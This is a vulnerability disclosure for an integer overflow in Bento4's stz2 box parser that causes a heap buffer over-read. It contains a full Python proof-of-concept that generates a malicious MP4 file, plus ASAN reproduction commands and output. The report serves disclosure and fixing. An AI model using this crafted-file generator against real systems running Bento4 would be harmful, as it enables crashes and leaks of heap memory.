## Bug0: AP4_Stz2Atom integer overflow leads to heap buffer over-read

In `AP4_Stz2Atom::AP4_Stz2Atom` (`Bento4/Source/C++/Core/Ap4Stz2Atom.cpp`), the `table_size` calculation `(sample_count * field_size + 7) / 8` performs unchecked 32-bit unsigned arithmetic that wraps around to 1 when `sample_count=0x20000001` and `field_size=8`, causing `buffer` to be allocated as a single byte while the subsequent loop reads `buffer[i]` for all `sample_count` iterations resulting in a heap buffer over-read.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT = 'poc_input.mp4'

def box(type_str, data):
    size = 8 + len(data)
    return struct.pack('>I', size) + type_str.encode('latin-1') + data

def full_box(type_str, version, flags, data):
    size = 12 + len(data)
    return struct.pack('>I', size) + type_str.encode('latin-1') + struct.pack('>B', version) + struct.pack('>I', flags)[1:] + data

ftyp_data = b'M4A ' + struct.pack('>I', 0)
ftyp = box('ftyp', ftyp_data)

identity_matrix = struct.pack('>9I',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)
mvhd_data = (
    struct.pack('>IIII', 0, 0, 1000, 0) +
    struct.pack('>I', 0x00010000) +
    struct.pack('>H', 0x0100) +
    b'\x00' * 10 +
    identity_matrix +
    b'\x00' * 24 +
    struct.pack('>I', 2)
)
mvhd = full_box('mvhd', 0, 0, mvhd_data)

tkhd_data = (
    struct.pack('>IIIII', 0, 0, 1, 0, 0) +
    b'\x00' * 8 +
    struct.pack('>HHHH', 0, 0, 0, 0) +
    identity_matrix +
    struct.pack('>II', 0, 0)
)
tkhd = full_box('tkhd', 0, 0, tkhd_data)

mdhd_data = (
    struct.pack('>IIII', 0, 0, 44100, 0) +
    struct.pack('>HH', 0, 0)
)
mdhd = full_box('mdhd', 0, 0, mdhd_data)

hdlr_data = (
    struct.pack('>I', 0) +
    b'soun' +
    b'\x00' * 12 +
    b'\x00'
)
hdlr = full_box('hdlr', 0, 0, hdlr_data)

smhd_data = struct.pack('>HH', 0, 0)
smhd = full_box('smhd', 0, 0, smhd_data)

url_entry = full_box('url ', 0, 1, b'')
dref_data = struct.pack('>I', 1) + url_entry
dref = full_box('dref', 0, 0, dref_data)
dinf = box('dinf', dref)

stsd_data = struct.pack('>I', 0)
stsd = full_box('stsd', 0, 0, stsd_data)

stts_data = struct.pack('>I', 0)
stts = full_box('stts', 0, 0, stts_data)

stsc_data = struct.pack('>I', 0)
stsc = full_box('stsc', 0, 0, stsc_data)

SAMPLE_COUNT = 0x20000001
FIELD_SIZE   = 8
stz2_size    = 20
stz2  = struct.pack('>I', stz2_size)
stz2 += b'stz2'
stz2 += struct.pack('>B', 0)
stz2 += b'\x00\x00\x00'
stz2 += b'\x00\x00\x00'
stz2 += struct.pack('>B', FIELD_SIZE)
stz2 += struct.pack('>I', SAMPLE_COUNT)

stco_data = struct.pack('>I', 0)
stco = full_box('stco', 0, 0, stco_data)

stbl_content = stsd + stts + stsc + stz2 + stco
stbl = box('stbl', stbl_content)

minf_content = smhd + dinf + stbl
minf = box('minf', minf_content)

mdia_content = mdhd + hdlr + minf
mdia = box('mdia', mdia_content)

trak_content = tkhd + mdia
trak = box('trak', trak_content)

moov_content = mvhd + trak
moov = box('moov', moov_content)

mp4 = ftyp + moov

with open(OUTPUT, 'wb') as f:
    f.write(mp4)
print(f"[*] Written {len(mp4)} bytes to {OUTPUT}")
print(f"[*] stz2: field_size={FIELD_SIZE}, sample_count=0x{SAMPLE_COUNT:08X}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000111 at pc 0x555e5d9ccef9 bp 0x7ffc71d5f860 sp 0x7ffc71d5f850
READ of size 1 at 0x502000000111 thread T0
    #0 0x555e5d9ccef8 in AP4_Stz2Atom::AP4_Stz2Atom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xc51ef8)
    #1 0x555e5d9cd9fb in AP4_Stz2Atom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xc529fb)

### Impact

An attacker who supplies a crafted MP4 file with a malicious `stz2` box can trigger a heap buffer over-read of unbounded size, reading far beyond a 1-byte allocation during the `sample_count` iteration loop, which can lead to information disclosure of adjacent heap contents or a crash constituting denial of service. This vulnerability is exposed through any invocation of `mp42aac` on an untrusted input file, requiring no special privileges, and is reachable on the standard file-parsing path triggered at startup.
